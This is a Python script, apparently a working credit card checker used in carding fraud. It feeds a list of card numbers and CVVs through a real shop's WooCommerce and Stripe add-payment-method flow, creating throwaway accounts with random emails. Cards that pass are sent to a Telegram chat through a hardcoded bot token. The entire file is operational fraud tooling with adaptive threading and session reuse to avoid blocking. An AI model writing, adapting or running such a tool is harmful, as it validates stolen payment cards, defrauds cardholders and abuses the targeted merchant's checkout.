import requests, random, string, re, threading, queue, time, os, json
from bs4 import BeautifulSoup
from telebot import TeleBot
from fake_useragent import UserAgent
import tkinter as tk
from tkinter import filedialog

# --- SETTINGS ---
BASE_URL = "https://nootdrink.com"
BOT_TOKEN = "7287626718:AAGzix6yZdUwzByW7rqTUR2zPERakoiIOMM"
CHAT_ID = "-1002823024470"
HEADERS_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64)...Chrome/117.0.0.0 Safari/537.36"
]

bot = TeleBot(BOT_TOKEN)
os.makedirs("cc_data", exist_ok=True)
PENDING = "cc_data/pending.txt"
PROCESSED = "cc_data/processed.txt"
DECLINED = "cc_data/declined.txt"
LIVE = "cc_data/live.txt"
SESSIONS_FILE = "cc_data/sessions.json"

sessions_store = []
if os.path.exists(SESSIONS_FILE):
    with open(SESSIONS_FILE, "r") as f:
        sessions_store = json.load(f)

queue_cards = queue.Queue()
safe_threads = 30
consecutive_errors = 0
stable_cycles = 0

def save_session(session):
    s = requests.utils.dict_from_cookiejar(session.cookies)
    sessions_store.append({"headers": dict(session.headers), "cookies": s})
    with open(SESSIONS_FILE, "w") as f:
        json.dump(sessions_store, f)

def random_email():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"

def send_hit(card, details):
    msg = f"""
<b>CC:</b> <code>{card}</code>
<b>Status:</b> Approved ✅
<b>Response:</b> Card added
<b>Gateway:</b> Braintree [Beta]
<b>Bank:</b> {details.get('bank', 'Unknown')}
<b>Category:</b> {details.get('category', 'Unknown')}
<b>Type:</b> {details.get('type', 'Unknown')}
<b>Country:</b> {details.get('country', 'Unknown')}
<b>Took:</b> {details.get('took', 'N/A')}s
"""
    bot.send_message(CHAT_ID, msg, parse_mode='HTML')
    print(f"[HIT] {card} -> LIVE ✅ | Took: {details.get('took', 'N/A')}s")

def smart_session():
    if sessions_store:
        item = random.choice(sessions_store)
        session = requests.Session()
        session.headers.update(item['headers'])
        session.cookies.update(item['cookies'])
        return session
    return None

def check_card(card):
    global consecutive_errors
    start = time.time()
    try:
        cc, mm, yy, cvv = card.strip().split("|")
        email = random_email()
        session = smart_session() or requests.Session()
        session.headers.update({
            'user-agent': random.choice(HEADERS_LIST),
            'accept': '*/*',
            'origin': BASE_URL,
            'referer': f"{BASE_URL}/my-account/add-payment-method/",
        })

        print(f"[🔍] Checking: {card}")
        r = session.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=15)
        if not smart_session():
            soup = BeautifulSoup(r.text, 'html.parser')
            nonce = soup.find("input", {"id": "woocommerce-register-nonce"})["value"]
            reg_data = {
                'email': email,
                'woocommerce-register-nonce': nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'register': 'Register'
            }
            session.post(f"{BASE_URL}/my-account/add-payment-method/", data=reg_data, timeout=15)
            save_session(session)

        r2 = session.get(f"{BASE_URL}/my-account/add-payment-method/", timeout=15)
        match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)', r2.text)
        if not match:
            raise Exception("Failed to extract Stripe nonce.")

        stripe_nonce = match.group(1)
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': session.headers['user-agent']
        }
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'billing_details[address][postal_code]': '10080',
            'billing_details[address][country]': 'US',
            'key': 'pk_live_51NAUM8Lf61hxViOn9Xvp95n2oKfPRynXvxsxLOf59nPavZ122R8VQoN4yGXYnvSSazB2oXlyjX4zbiKKl8VpaISS000DfXsjgt'
        }
        stripe_resp = requests.post("https://api.stripe.com/v1/payment_methods", headers=stripe_headers, data=stripe_data)
        stripe_json = stripe_resp.json()
        if "error" in stripe_json:
            msg = stripe_json['error']['message']
            print(f"[DECLINED] {card} => {msg}")
            with open(DECLINED, "a") as f: f.write(f"{card} => {msg}\n")
            with open(PROCESSED, "a") as f: f.write(card + "\n")
            return "DECLINED"

        pm_id = stripe_json.get("id")
        confirm_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': stripe_nonce
        }
        session.headers.update({
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'x-requested-with': 'XMLHttpRequest'
        })
        confirm = session.post(BASE_URL, params={'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}, data=confirm_data)
        result = confirm.json()

        if result.get("success"):
            took = round(time.time() - start, 2)
            send_hit(card, {"took": took})
            with open(PROCESSED, "a") as f: f.write(card + "\n")
            with open(LIVE, "a") as f: f.write(card + "\n")
            return "OK"
        else:
            error_msg = result.get('data', {}).get('error', {}).get('message', 'Unknown error')
            print(f"[DECLINED] {card} => {error_msg}")
            with open(DECLINED, "a") as f: f.write(f"{card} => {error_msg}\n")
            with open(PROCESSED, "a") as f: f.write(card + "\n")
            return "DECLINED"

    except Exception as e:
        print(f"[ERROR] {card} => {str(e)}")
        with open(PENDING, "a") as f: f.write(card + "\n")
        with open(DECLINED, "a") as f: f.write(f"{card} => {str(e)}\n")
        consecutive_errors += 1
        return "ERROR"

def adaptive_worker(card):
    global consecutive_errors, safe_threads, stable_cycles
    result = check_card(card)
    if result == "OK":
        stable_cycles += 1
        if stable_cycles >= 10 and safe_threads < os.cpu_count() * 10:
            safe_threads += 1
            print(f"[+] Increased threads to {safe_threads}")
            stable_cycles = 0
    elif result == "ERROR":
        consecutive_errors += 1
        if consecutive_errors >= 15:
            safe_threads = max(1, safe_threads - 5)
            print(f"[-] Decreased threads to {safe_threads} due to real errors.")
            consecutive_errors = 0
            if safe_threads <= 1:
                print("[⛔] Critical failure at 1 thread. Exiting.")
                os._exit(1)

def thread_controller():
    while not queue_cards.empty():
        if threading.active_count() - 1 < safe_threads:
            try:
                card = queue_cards.get_nowait()
                threading.Thread(target=adaptive_worker, args=(card,)).start()
            except queue.Empty:
                break
        else:
            time.sleep(0.05)

def main():
    root = tk.Tk()
    root.withdraw()
    print('"[DIR] Please select your CC list file from file dialog..."')

    filepath = filedialog.askopenfilename(title="Select CC List File", filetypes=[("Text files", "*.txt")])
    if not filepath:
        print("[❌] No file selected. Exiting.")
        return
    with open(filepath) as f:
        cards = [line.strip() for line in f if line.strip()]
    for card in cards:
        queue_cards.put(card)

    print(f"[⚙️] Loaded {len(cards)} cards. Starting adaptive checking...")
    thread_controller()

    while threading.active_count() > 1:
        time.sleep(1)

    print("\n[✅] Finished all checks.")

if __name__ == "__main__":
    main()
